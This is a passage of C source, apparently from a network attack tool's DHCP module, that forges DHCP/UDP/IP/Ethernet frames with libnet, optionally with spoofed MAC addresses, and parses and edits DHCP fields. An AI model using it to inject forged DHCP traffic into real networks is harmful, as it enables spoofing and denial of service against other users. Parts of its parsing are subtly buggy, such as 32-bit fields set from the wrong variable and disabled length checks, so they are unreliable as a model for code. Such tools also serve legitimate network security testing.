                dhcp_data->hops,                        /* hop count */
                dhcp_data->xid,                         /* transaction id */
                dhcp_data->secs,                        /* seconds since bootstrap */
                dhcp_data->flags,                       /* flags */
                dhcp_data->ciaddr,                      /* client ip */
                dhcp_data->yiaddr,                      /* your ip */
                dhcp_data->siaddr,                      /* server ip */
                dhcp_data->giaddr,                      /* gateway ip */
                dhcp_data->chaddr,                      /* client hardware addr */
                /* (u_int8_t *)dhcp_data->sname,*/           /* server host name */
                NULL,           /* server host name */
/*                (u_int8_t *)dhcp_data->fname,*/            /* boot file */
                NULL,            /* boot file */
                dhcp_data->options_len?dhcp_data->options:NULL, /* dhcp options stuck in payload since it is dynamic */
                dhcp_data->options_len,                 /* length of options */
                lhandler,                               /* libnet handle */
                0);                                     /* libnet id */

            if (t == -1) 
            {
                thread_libnet_error( "Can't build dhcp packet",lhandler);
                libnet_clear_packet(lhandler);
                return -1;
            }  

            t = libnet_build_udp(
                dhcp_data->sport,                               /* source port */
                dhcp_data->dport,                               /* destination port */
                LIBNET_UDP_H + LIBNET_DHCPV4_H 
                    + dhcp_data->options_len,                   /* packet size */
                0,                                              /* checksum */
                NULL,                                           /* payload */
                0,                                              /* payload size */
                lhandler,                                       /* libnet handle */
                0);                                             /* libnet id */

            if (t == -1) 
            {
                thread_libnet_error( "Can't build udp datagram",lhandler);
                libnet_clear_packet(lhandler);
                return -1;
            }  

            t = libnet_build_ipv4(
                LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DHCPV4_H
                + dhcp_data->options_len,                       /* length */
                0x10,                                           /* TOS */
                0,                                              /* IP ID */
                0,                                              /* IP Frag */
                16,                                             /* TTL */
                IPPROTO_UDP,                                    /* protocol */
                0,                                              /* checksum */
                dhcp_data->sip,                                 /* src ip */
                dhcp_data->dip,                                 /* destination ip */
                NULL,                                           /* payload */
                0,                                              /* payload size */
                lhandler,                                       /* libnet handle */
                0);                                             /* libnet id */

            if (t == -1) 
            {
                thread_libnet_error("Can't build ipv4 packet",lhandler);
                libnet_clear_packet(lhandler);
                return -1;
            }  

            t = libnet_build_ethernet(
                    dhcp_data->mac_dest,                /* ethernet destination */
                    (attacks->mac_spoofing) ? dhcp_data->mac_source : iface_data->etheraddr,
                    /* ethernet source */
                    ETHERTYPE_IP,
                    NULL,                               /* payload */
                    0,                                  /* payload size */
                    lhandler,                           /* libnet handle */
                    0);                                 /* libnet id */

            if (t == -1)
            {
                thread_libnet_error("Can't build ethernet header",lhandler);
                libnet_clear_packet(lhandler);
                return -1;
            }

            /*
             *  Write it to the wire.
             */
            sent = libnet_write(lhandler);

            if (sent == -1) {
                thread_libnet_error("libnet_write error", lhandler);
                libnet_clear_packet(lhandler);
                return -1;
            }

            libnet_clear_packet(lhandler);
            protocols[PROTO_DHCP].packets_out++;
            iface_data2 = interfaces_get_struct(iface_data->ifname);
            iface_data2->packets_out[PROTO_DHCP]++;
    }
    
    return 0;
}


int8_t
dhcp_learn_offer(struct attacks *attacks)
{
    struct dhcp_data *dhcp_data;
    struct pcap_pkthdr header;
    struct timeval now;
    u_int8_t *packet, *dhcp, *temp;
    int8_t got_offer = 0;

    dhcp_data = attacks->data;

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        return -1;
    
    gettimeofday(&now,NULL);
    
    header.ts.tv_sec = now.tv_sec;
    header.ts.tv_usec = now.tv_usec;
             
    while (!got_offer && !attacks->attack_th.stop)
    {
        interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet, PROTO_DHCP, NO_TIMEOUT);
        if (attacks->attack_th.stop)
        {
            free(packet);
            return -1;
        }

        dhcp = (packet + LIBNET_ETH_H + LIBNET_IPV4_H + LIBNET_UDP_H);

        /* Now we need the SID, yiaddr and the secs */
        dhcp_data->secs = (*(u_int16_t *) dhcp + 7);

        /* let's go to the options */
        temp = dhcp + 240;

        /* find the magic 
        if (((*(u_char *) temp) == 0x63) && ((*(u_char *) temp + 1) == 0x82) 
            && ((*(u_char *) temp + 2) == 0x53) && ((*(u_char *) temp + 3) == 0x63))
            printf("Tengo magic\n");

        switch (*(dhcp))
        {
            case LIBNET_DHCP_REPLY:


                switch(*temp) {
                    case LIBNET_DHCP_MESSAGETYPE:
                        if (*((u_char *) dhcp + 2) == LIBNET_DHCP_MSGOFFER)
                            got_offer = 1;
                    break;
                }
            break;
            default:
            break;
        }*/ /* switch */

    } /* While got */

    free(packet);

    return 0;
}


/* 
 * Return formated strings of each DHCP field
 */
char **
dhcp_get_printable_packet(struct pcap_data *data)
{
   struct libnet_ethernet_hdr *ether;
   u_int8_t *dhcp_data, *udp_data, *ip_data, *ptr;
   u_int8_t len, i, k, type, end, desc_len;
#ifdef LBL_ALIGN
   u_int16_t aux_short;
   u_int32_t aux_long;
#endif
   char buffer[4096], *buf_ptr;
   u_int32_t total_len;
   char **field_values;

   if ((field_values = (char **) protocol_create_printable(protocols[PROTO_DHCP].nparams, protocols[PROTO_DHCP].parameters)) == NULL) {
      write_log(0, "Error in calloc\n");
      return NULL;
   }

   ether = (struct libnet_ethernet_hdr *) data->packet;
   ip_data = (u_char *) (data->packet + LIBNET_ETH_H);
   udp_data = (data->packet + LIBNET_ETH_H + (((*(data->packet + LIBNET_ETH_H))&0x0F)*4));
   dhcp_data = udp_data + LIBNET_UDP_H;

   /* Source MAC */
   snprintf(field_values[DHCP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
         ether->ether_shost[0], ether->ether_shost[1], ether->ether_shost[2],
         ether->ether_shost[3], ether->ether_shost[4], ether->ether_shost[5]);
   /* Destination MAC */
   snprintf(field_values[DHCP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
         ether->ether_dhost[0], ether->ether_dhost[1], ether->ether_dhost[2],
         ether->ether_dhost[3], ether->ether_dhost[4], ether->ether_dhost[5]);

   /* Source IP */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long, (ip_data+12), 4);
   parser_get_formated_inet_address_fill(ntohl(aux_long), field_values[DHCP_SIP], 16, 0);
#else
   parser_get_formated_inet_address_fill(ntohl(*(u_int32_t *)(ip_data+12)), field_values[DHCP_SIP], 16, 0);
#endif

   /* Destination IP */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long, (ip_data+16), 4);
   parser_get_formated_inet_address_fill(ntohl(aux_long), field_values[DHCP_DIP], 16, 0);
#else
   parser_get_formated_inet_address_fill(ntohl(*(u_int32_t *)(ip_data+16)), field_values[DHCP_DIP], 16, 0);
#endif

   /* Source port */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_short, udp_data, 2);
   snprintf(field_values[DHCP_SPORT], 5, "%hd", ntohs(aux_short));
#else
   snprintf(field_values[DHCP_SPORT], 5, "%hd", ntohs(*(u_int16_t *)udp_data));
#endif
   /* Destination port */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_short, udp_data+2, 2);
   snprintf(field_values[DHCP_DPORT], 5, "%hd", ntohs(aux_short));
#else
   snprintf(field_values[DHCP_DPORT], 5, "%hd", ntohs(*(u_int16_t *)(udp_data+2)));
#endif

   /* Op */
   snprintf(field_values[DHCP_OP], 3, "%02X", *((u_char *)dhcp_data));
   /* htype */
   snprintf(field_values[DHCP_HTYPE], 3, "%02X", *((u_char *)dhcp_data+1));
   /* hlen */
   snprintf(field_values[DHCP_HLEN], 3, "%02X", *((u_char *)dhcp_data+2));
   /* hops */
   snprintf(field_values[DHCP_HOPS], 3, "%02X", *((u_char *)dhcp_data+3));

   /* xid */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long,(dhcp_data+4),4);
   snprintf(field_values[DHCP_XID], 9, "%08lX", ntohl(aux_long));
#else
   snprintf(field_values[DHCP_XID], 9, "%08lX", (u_long) ntohl(*(u_int32_t *)(dhcp_data+4)));
#endif

   /* secs */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_short, dhcp_data+8, 2);
   snprintf(field_values[DHCP_SECS], 5, "%04hX", ntohs(aux_short));
#else
   snprintf(field_values[DHCP_SECS], 5, "%04hX", ntohs(*(u_int16_t *)(dhcp_data+8)));
#endif
   /* flags */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_short, dhcp_data+10, 2);
   snprintf(field_values[DHCP_FLAGS], 5, "%04hX", ntohs(aux_short));
#else
   snprintf(field_values[DHCP_FLAGS], 5, "%04hX", ntohs(*(u_int16_t *)(dhcp_data+10)));
#endif

   /* ciaddr */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long, (dhcp_data+12), 4);
   parser_get_formated_inet_address_fill(ntohl(aux_long), field_values[DHCP_CIADDR], 16, 0);
#else
   parser_get_formated_inet_address_fill(ntohl(*(u_int32_t *)(dhcp_data+12)), field_values[DHCP_CIADDR], 16, 0);
#endif
   /* yiaddr */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long, (dhcp_data+16), 4);
   parser_get_formated_inet_address_fill(ntohl(aux_long), field_values[DHCP_YIADDR], 16, 0);
#else
   parser_get_formated_inet_address_fill(ntohl(*(u_int32_t *)(dhcp_data+16)), field_values[DHCP_YIADDR], 16, 0);
#endif
   /* siaddr */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long, (dhcp_data+20), 4);
   parser_get_formated_inet_address_fill(ntohl(aux_long), field_values[DHCP_SIADDR], 16, 0);
#else
   parser_get_formated_inet_address_fill(ntohl(*(u_int32_t *)(dhcp_data+20)), field_values[DHCP_SIADDR], 16, 0);
#endif
   /* giaddr */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long, (dhcp_data+24), 4);
   parser_get_formated_inet_address_fill(ntohl(aux_long), field_values[DHCP_GIADDR], 16, 0);
#else
   parser_get_formated_inet_address_fill(ntohl(*(u_int32_t *)(dhcp_data+24)), field_values[DHCP_GIADDR], 16, 0);
#endif
   /* chaddr */
   snprintf(field_values[DHCP_CHADDR], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
         *(dhcp_data+28)&0xFF, *(dhcp_data+29)&0xFF, *(dhcp_data+30)&0xFF,
         *(dhcp_data+31)&0xFF, *(dhcp_data+32)&0xFF, *(dhcp_data+33)&0xFF);

   /* options */
   memset((void *)&buffer, 0, 4096);
   ptr = dhcp_data + 240;
   buf_ptr = buffer;
   total_len = 0;
   i = 0;
   end = 0;
   while((!end) && (ptr < data->packet + data->header->caplen) && (i < MAX_TLV)) {
      if ((ptr+1) > (data->packet + data->header->caplen)) /* Undersized packet !! */ {
         write_log(0, "Undersized packet!!\n");
         return NULL;
      }

      type = (*(u_int8_t *)ptr);
      len = (*(u_int8_t *)(ptr + 1));

      /* My crappy ADSL router always sends oversized packets with
       * padding with __important__ data in!! */
      /*            if ((ptr + len) > data->packet + data->header->caplen) {
                    write_log(0, "Oversized packet!!\n");
                    return NULL; 
                    }*/

      if (!len && type != LIBNET_DHCP_END) 
      {
         write_log(0, "Error in dhcp_get_printable: len is %d and type is %d\n", len, type);
         return (char **)field_values;
      }

      if (len || ((type == LIBNET_DHCP_END) && (len == 0)))
      {
         for (k=0; k < protocols[PROTO_DHCP].extra_nparams; k++)
         {
            if (protocols[PROTO_DHCP].extra_parameters[k].id == type) {
               desc_len = strlen(protocols[PROTO_DHCP].extra_parameters[k].ldesc);
               strncpy(buf_ptr, protocols[PROTO_DHCP].extra_parameters[k].ldesc, desc_len);
               buf_ptr += desc_len + 1;
               total_len += desc_len + 1;
               switch(type) {
                  case LIBNET_DHCP_END:
                     *buf_ptr = '\0';
                     buf_ptr++;
                     /* end */
                     *buf_ptr = '\0';
                     total_len += 2;
                     end = 1;
                     break;
                  case LIBNET_DHCP_MESSAGETYPE:
                     snprintf(buf_ptr, 3, "%02X", *((u_char *)(ptr+2)));
                     buf_ptr += 3;
                     total_len += 3;
                     break;
                  case LIBNET_DHCP_LEASETIME:
                  case LIBNET_DHCP_RENEWTIME:
                  case LIBNET_DHCP_REBINDTIME:
#ifdef LBL_ALIGN
                     memcpy((void *)&aux_long, ptr, 4);
                     snprintf(buf_ptr, 9, "%08lX", ntohl(aux_long));
#else
                     snprintf(buf_ptr, 9, "%08lX", (u_long) ntohl(*(u_int32_t *)(ptr+2)));
#endif
                     buf_ptr += 9;
                     total_len += 9;
                     break;
                  case LIBNET_DHCP_SUBNETMASK:
                  case LIBNET_DHCP_SERVIDENT:
                  case LIBNET_DHCP_ROUTER:
                  case LIBNET_DHCP_DNS:
                  case LIBNET_DHCP_DISCOVERADDR:
                     write_log(0, "a ver...\n");
                     if (parser_get_formated_inet_address(ntohl(*(u_int32_t *)(ptr+2)), buf_ptr, 16) < 0)
                     {
                        *buf_ptr = '\0';
                        total_len += 1;
                     } else {
                        buf_ptr += 16;
                        total_len += 16;
                     }
                     break;
                  case LIBNET_DHCP_DOMAINNAME:
                  case LIBNET_DHCP_CLASSSID:
                  case LIBNET_DHCP_HOSTNAME:
                  case LIBNET_DHCP_MESSAGE:
                     if (len < MAX_VALUE_LENGTH) {
                        memcpy(buf_ptr, ptr+2, len);
                        buf_ptr += len + 1;
                        total_len += len + 1;
                     } else {
                        memcpy(buf_ptr, ptr+2, MAX_VALUE_LENGTH);
                        buf_ptr += MAX_VALUE_LENGTH + 1;
                        total_len += MAX_VALUE_LENGTH + 1;
                     }
                     break;
                  default:
                     *buf_ptr = '\0';
                     buf_ptr++;
                     total_len++;
                     break;
               }
               break;
            }
         }
      }
      i++;
      ptr +=len + 2;
   }

   if ((field_values[DHCP_TLV] = (char *) calloc(1, total_len)) == NULL)
      write_log(0, "error in calloc\n");

   memset((void *)field_values[DHCP_TLV], 0, total_len);
   memcpy((void *)field_values[DHCP_TLV], (void *)buffer, total_len);

   return (char **)field_values;
}


int8_t
dhcp_load_values(struct pcap_data *data, void *values)
{
    struct libnet_ethernet_hdr *ether;
    struct dhcp_data *dhcp;
    u_char *dhcp_data, *ip_data, *udp_data;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
    u_int32_t aux_long;
#endif
    u_int8_t i, type, len, *ptr;
    u_int16_t total;

    dhcp = (struct dhcp_data *)values;
    ether = (struct libnet_ethernet_hdr *) data->packet;
    ip_data = (u_char *) (data->packet + LIBNET_ETH_H);
    udp_data = (data->packet + LIBNET_ETH_H + (((*(data->packet + LIBNET_ETH_H))&0x0F)*4));
    dhcp_data = udp_data + LIBNET_UDP_H;

    /* Source MAC */
    memcpy(dhcp->mac_source, ether->ether_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(dhcp->mac_dest, ether->ether_dhost, ETHER_ADDR_LEN);

    /* Source IP */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long,(ip_data+12),4);
    dhcp->sip = ntohl(aux_long);
#else
    dhcp->sip = ntohl(*(u_int32_t *)(ip_data+12));
#endif
    /* Destination IP */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long,(ip_data+16),4);
    dhcp->dip = ntohl(aux_long);
#else
    dhcp->dip = ntohl(*(u_int32_t *)(ip_data+16));
#endif

    /* Source port */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, udp_data, 2);
    dhcp->sport = ntohs(aux_short);
#else
    dhcp->sport = ntohs(*(u_int16_t *)udp_data);
#endif
    /* Destination port */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, udp_data+2, 2);
    dhcp->dport = ntohs(aux_short);
#else
    dhcp->dport = ntohs(*(u_int16_t *)(udp_data+2));
#endif

    /* Op */
    dhcp->op = *((u_char *)dhcp_data);
    /* Htype */
    dhcp->htype = *((u_char *)dhcp_data+1);
    /* Hlen */
    dhcp->hlen = *((u_char *)dhcp_data+2);
    /* Hops */
    dhcp->hops = *((u_char *)dhcp_data+3);
    /* Xid */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long, dhcp_data+4, 4);
    dhcp->xid = ntohs(aux_short);
#else
    dhcp->xid = ntohl(*(u_int32_t *)(dhcp_data+4));
#endif
    /* Secs */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, dhcp_data+8, 2);
    dhcp->secs = ntohs(aux_short);
#else
    dhcp->secs = ntohs(*(u_int16_t *)(dhcp_data+8));
#endif
    /* Flags */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, dhcp_data+10, 2);
    dhcp->flags = ntohs(aux_short);
#else
    dhcp->flags = ntohs(*(u_int16_t *)(dhcp_data+10));
#endif
    /* Ciaddr */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long, dhcp_data+12, 4);    
    dhcp->ciaddr = ntohs(aux_short);
#else
    dhcp->ciaddr = ntohl(*(u_int32_t *)(dhcp_data+12));
#endif
    /* Yiaddr */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long, dhcp_data+16, 4);
    dhcp->yiaddr = ntohs(aux_short);
#else
    dhcp->yiaddr = ntohl(*(u_int32_t *)(dhcp_data+16));
#endif
    /* Siaddr */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long, dhcp_data+20, 4);
    dhcp->siaddr = ntohs(aux_short);
#else
    dhcp->siaddr = ntohl(*(u_int32_t *)(dhcp_data+20));
#endif
    /* Giaddr */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long, dhcp_data+24, 4);
    dhcp->giaddr = ntohs(aux_short);
#else
    dhcp->giaddr = ntohl(*(u_int32_t *)(dhcp_data+24));
#endif
    /* Chaddr */
    memcpy(dhcp->chaddr, dhcp_data+28, ETHER_ADDR_LEN);

    ptr = dhcp_data + 240;
    i = 0;
    total = 0;

    /* now the tlv section starts */
    while((ptr < data->packet + data->header->caplen) && (i < MAX_TLV) && (total < MAX_TLV*MAX_VALUE_LENGTH)) {
        if ((ptr+1) > ( data->packet + data->header->caplen)) /* Undersized packet !! */ {
			write_log(0, "undersized packet\n");
            return 0;
		}

        type = (*(u_int8_t *)ptr);
        len = (*(u_int8_t *)(ptr + 1));

/*
        if ((ptr + len+2) > data->packet + data->header->caplen) {
			write_log(0, "Oversized packet\n");
            return -1; 
		}*/

/*        if (!len)
            return 0;*/

        /*
         * TLV len must be at least 5 bytes (header + data).  
         * Anyway i think we can give a chance to the rest
         * of TLVs... ;)
         */
        if ((type == LIBNET_DHCP_END) || ((len) && (total + len < MAX_TLV*MAX_VALUE_LENGTH)))
			memcpy((void *)(dhcp->options + total), (void *)ptr, len+2);

        i++;
        ptr += len + 2;
        total += len + 2;
    }

    dhcp->options_len = total;

    return 0;
}


char **
dhcp_get_printable_store(struct term_node *node)
{
   struct dhcp_data *dhcp;
   char **field_values, *tlv;
#ifdef LBL_ALIGN
   u_int16_t aux_short;
   u_int32_t aux_long;
#endif
   u_int8_t *ptr;
   u_int8_t len, i, k, type, end;
   char buffer[4096], *buf_ptr;
   u_int32_t total_len;


   /* smac + dmac + sip + dip + sport + dport + op + htype + hlen + hops +
    * + xid + secs + flags + ciaddr + yiaddr + siaddr + giaddr + chaddr +
    * null = 19 */
   if ((field_values = (char **) protocol_create_printable(protocols[PROTO_DHCP].nparams, protocols[PROTO_DHCP].parameters)) == NULL) {
      write_log(0, "Error in calloc\n");
      return NULL;
   }

   if (node == NULL)
      dhcp = protocols[PROTO_DHCP].default_values;
   else
      dhcp = (struct dhcp_data *) node->protocol[PROTO_DHCP].tmp_data;

   /* Source MAC */
   snprintf(field_values[DHCP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
         dhcp->mac_source[0], dhcp->mac_source[1],
         dhcp->mac_source[2], dhcp->mac_source[3],
         dhcp->mac_source[4], dhcp->mac_source[5]);
   /* Destination MAC */
   snprintf(field_values[DHCP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
         dhcp->mac_dest[0], dhcp->mac_dest[1],
         dhcp->mac_dest[2], dhcp->mac_dest[3],
         dhcp->mac_dest[4], dhcp->mac_dest[5]);

   /* Source IP */
   parser_get_formated_inet_address(dhcp->sip , field_values[DHCP_SIP], 16);
   /* Destination IP */
   parser_get_formated_inet_address(dhcp->dip , field_values[DHCP_DIP], 16);

   /* Source port */
   snprintf(field_values[DHCP_SPORT], 6, "%05hd", dhcp->sport);
   /* Destination port */
   snprintf(field_values[DHCP_DPORT], 6, "%05hd", dhcp->dport);

   /* Op */
   snprintf(field_values[DHCP_OP], 3, "%02X", dhcp->op);
   /* Htype */
   snprintf(field_values[DHCP_HTYPE], 3, "%02X", dhcp->htype);
   /* Hlen */
   snprintf(field_values[DHCP_HLEN], 3, "%02X", dhcp->hlen);
   /* Hops */
   snprintf(field_values[DHCP_HOPS], 3, "%02X", dhcp->hops);

   /* Xid */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long, (void *)&dhcp->xid, 4);
   snprintf(field_values[DHCP_XID], 9, "%08X", aux_long);
#else
   snprintf(field_values[DHCP_XID], 9, "%08X", dhcp->xid);
#endif
   /* Secs */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_short, (void *)&dhcp->secs, 2);
   snprintf(field_values[DHCP_SECS], 5, "%04X", aux_short);
#else
   snprintf(field_values[DHCP_SECS], 5, "%04X", dhcp->secs);
#endif
   /* Flags */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_short, (void *)&dhcp->flags, 2);
   snprintf(field_values[DHCP_FLAGS], 5, "%04X", aux_short);
#else
   snprintf(field_values[DHCP_FLAGS], 5, "%04X", dhcp->flags);
#endif

   /* Ciaddr */
   parser_get_formated_inet_address(dhcp->ciaddr , field_values[DHCP_CIADDR], 16);
   /* Yiaddr */
   parser_get_formated_inet_address(dhcp->yiaddr , field_values[DHCP_YIADDR], 16);
   /* Siaddr */
   parser_get_formated_inet_address(dhcp->siaddr , field_values[DHCP_SIADDR], 16);
   /* Giaddr */
   parser_get_formated_inet_address(dhcp->giaddr , field_values[DHCP_GIADDR], 16);

   /* Chaddr */
   snprintf(field_values[DHCP_CHADDR], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
         dhcp->chaddr[0], dhcp->chaddr[1],
         dhcp->chaddr[2], dhcp->chaddr[3],
         dhcp->chaddr[4], dhcp->chaddr[5]);

   /* options */
   ptr = dhcp->options;
   buf_ptr = buffer;
   total_len = 0;
   i = 0;
   end = 0;
   tlv = field_values[DHCP_TLV];

   while((!end) && (ptr < dhcp->options + dhcp->options_len) && (i < MAX_TLV)) {
      type = (*(u_int8_t *)ptr);
      len = (*(u_int8_t *)(ptr + 1));

      /* My crappy ADSL router always sends oversized packets with
       * padding with __important__ data in!! */
      /*            if ((ptr + len) > data->packet + data->header->caplen) {
                    write_log(0, "Oversized packet!!\n");
                    return NULL; 
                    }*/

      /*		if (!len && type != LIBNET_DHCP_END)
            return NULL;*/

      if (len || ((type == LIBNET_DHCP_END) && (len == 0)))
      {
         k = 0;
         while(dhcp_type_desc[k].desc) {
            if (dhcp_type_desc[k].type == type) {
               strncpy(buf_ptr, dhcp_type_desc[k].desc, strlen((char *)dhcp_type_desc[k].desc));
               buf_ptr += strlen((char *)dhcp_type_desc[k].desc) + 1;
               total_len += strlen((char *)dhcp_type_desc[k].desc) + 1;
               switch(type) {
                  case LIBNET_DHCP_END:
                     end = 1;
                     break;
                  case LIBNET_DHCP_MESSAGETYPE:
                     snprintf(buf_ptr, 3, "%02X", *((u_char *)(ptr+2)));
                     buf_ptr += 3;
                     total_len += 3;
                     break;
                  case LIBNET_DHCP_LEASETIME:
                  case LIBNET_DHCP_RENEWTIME:
                  case LIBNET_DHCP_REBINDTIME:
#ifdef LBL_ALIGN
                     memcpy((void *)&aux_long, ptr, 4);
                     snprintf(buf_ptr, 9, "%08lX", ntohl(aux_long));
#else
                     snprintf(buf_ptr, 9, "%08lX", (u_long) ntohl(*(u_int32_t *)(ptr+2)));
#endif
                     buf_ptr += 9;
                     total_len += 9;
                     break;
                  case LIBNET_DHCP_SUBNETMASK:
                  case LIBNET_DHCP_SERVIDENT:
                  case LIBNET_DHCP_ROUTER:
                  case LIBNET_DHCP_DNS:
                  case LIBNET_DHCP_DISCOVERADDR:
                     parser_get_formated_inet_address(ntohl(*(u_int32_t *)(ptr+2)), buf_ptr, 16);
                     buf_ptr += 16;
                     total_len += 16;
                     break;
                  case LIBNET_DHCP_DOMAINNAME:
                  case LIBNET_DHCP_CLASSSID:
                  case LIBNET_DHCP_HOSTNAME:
                  case LIBNET_DHCP_MESSAGE:
                     if (len < MAX_VALUE_LENGTH) {
                        memcpy(buf_ptr, ptr+2, len);
                        buf_ptr += len + 1;
                        total_len += len + 1;
                        /*				        dhcp_print->tlv[i].value[len] = '\0';*/
                     } else {
                        memcpy(buf_ptr, ptr+2, MAX_VALUE_LENGTH-2);
                        buf_ptr += MAX_VALUE_LENGTH + 1;
                        total_len += MAX_VALUE_LENGTH + 1;
                        /*				        dhcp_print->tlv[i].value[MAX_VALUE_LENGTH-2] = '|';
                                            dhcp_print->tlv[i].value[MAX_VALUE_LENGTH-1] = '\0';*/
                     }
                     break;
                  default:
                     *buf_ptr = '\0';
                     buf_ptr++;
                     total_len++;
                     break;
               }
            }
            k++;
         }
      }
      i++;
      ptr +=len + 2;
   }

   if ((field_values[DHCP_TLV] = (char *) calloc(1, total_len)) == NULL)
      write_log(0, "error in calloc\n");

   memcpy((void *)field_values[DHCP_TLV], (void *)buffer, total_len);

   return (char **)field_values;
}



int8_t 
dhcp_update_field(int8_t state, struct term_node *node, void *value)
{
    struct dhcp_data *dhcp_data;
    
	if (node == NULL)
		dhcp_data = protocols[PROTO_DHCP].default_values;
	else
        dhcp_data = node->protocol[PROTO_DHCP].tmp_data;

    switch(state)
    {
        /* Source MAC */
        case DHCP_SMAC:
            memcpy((void *)dhcp_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Destination MAC */
        case DHCP_DMAC:
            memcpy((void *)dhcp_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;
        /* Op */
        case DHCP_OP:
	        dhcp_data->op = *(u_int8_t *)value;
        break;
        /* Htype */
        case DHCP_HTYPE:
	        dhcp_data->htype = *(u_int8_t *)value;
        break;
        /* Hlen */
        case DHCP_HLEN:
	        dhcp_data->hlen = *(u_int8_t *)value;
        break;
        /* Hlen */
        case DHCP_HOPS:
	        dhcp_data->hops = *(u_int8_t *)value;
        break;
		/* Xid */
        case DHCP_XID:
	        dhcp_data->xid = *(u_int32_t *)value;
        break;
		/* Secs */
        case DHCP_SECS:
	        dhcp_data->secs = *(u_int16_t *)value;
        break;
		/* Flags */
        case DHCP_FLAGS:
	        dhcp_data->flags = *(u_int16_t *)value;
        break;
		/* Ciaddr */
        case DHCP_CIADDR:
	        dhcp_data->ciaddr = *(u_int32_t *)value;
        break;
		/* Yiaddr */
        case DHCP_YIADDR:
	        dhcp_data->yiaddr = *(u_int32_t *)value;
        break;
		/* Siaddr */
        case DHCP_SIADDR:
	        dhcp_data->siaddr = *(u_int32_t *)value;
        break;
		/* Giaddr */
        case DHCP_GIADDR:
	        dhcp_data->giaddr = *(u_int32_t *)value;
        break;
        /* Chaddr */
        case DHCP_CHADDR:
            memcpy((void *)dhcp_data->chaddr, (void *)value, ETHER_ADDR_LEN);
        break;
        /* Msg */
        /* Options */
        /* SPort */
		case DHCP_SPORT:
	        dhcp_data->sport = *(u_int16_t *)value;
        break;
        /* DPort */
        case DHCP_DPORT:
	        dhcp_data->dport = *(u_int16_t *)value;
        break;
		/* Source IP */
		case DHCP_SIP:
		    dhcp_data->sip = *(u_int32_t *)value;
		break;
		case DHCP_DIP:
		    dhcp_data->dip = *(u_int32_t *)value;
		break;
	    default:
	    break;
    }

    return 0;
}


char *
dhcp_get_type_info(u_int16_t type)
{
    u_int8_t i;

    i = 0;
    while (dhcp_type_desc[i].desc) {
        if (dhcp_type_desc[i].type == type)
            return dhcp_type_desc[i].desc;
        i++;
    }

    return "";
}


int8_t
dhcp_init_attribs(struct term_node *node)
{
    /* the default is a DHCPDISCOVER packet */

    struct dhcp_data *dhcp_data;
    u_int32_t lbl32;

    dhcp_data = node->protocol[PROTO_DHCP].tmp_data;
    
    dhcp_data->op = DHCP_DFL_OPCODE;
    dhcp_data->htype = DHCP_DFL_HW_TYPE;
    dhcp_data->hlen = DHCP_DFL_HW_LEN;
    dhcp_data->hops = DHCP_DFL_HOPS;

    lbl32 = libnet_get_prand(LIBNET_PRu32);

    memcpy((void *)&dhcp_data->xid, (void *) &lbl32, sizeof(u_int32_t));

    dhcp_data->secs = DHCP_DFL_SECS;
    dhcp_data->flags = DHCP_DFL_FLAGS;

    dhcp_data->ciaddr = 0;
    dhcp_data->yiaddr = 0;
    dhcp_data->giaddr = 0;
    dhcp_data->siaddr = 0;

/*    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->ciaddr, (void *) &lbl32, 4);

    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->yiaddr, (void *) &lbl32, 4);

    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->siaddr, (void *) &lbl32, 4);

    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->giaddr, (void *) &lbl32, 4);*/

    dhcp_data->sport = DHCP_CLIENT_PORT;
    dhcp_data->dport = DHCP_SERVER_PORT;
    dhcp_data->sip = 0;
    dhcp_data->dip = inet_addr("255.255.255.255");
    attack_gen_mac(dhcp_data->mac_source);
    dhcp_data->mac_source[0] &= 0x0E; 

    /* chaddr = mac_source */
    memcpy((void *) dhcp_data->chaddr, (void *) dhcp_data->mac_source, ETHER_ADDR_LEN);
    parser_vrfy_mac("FF:FF:FF:FF:FF:FF",dhcp_data->mac_dest);

    /* options */
    dhcp_data->options[0] = LIBNET_DHCP_MESSAGETYPE;
    dhcp_data->options[1] = 1;
    dhcp_data->options[2] = LIBNET_DHCP_MSGDISCOVER;
    dhcp_data->options[3] = LIBNET_DHCP_END;

    dhcp_data->options_len = 4;

    return 0;
}



int8_t
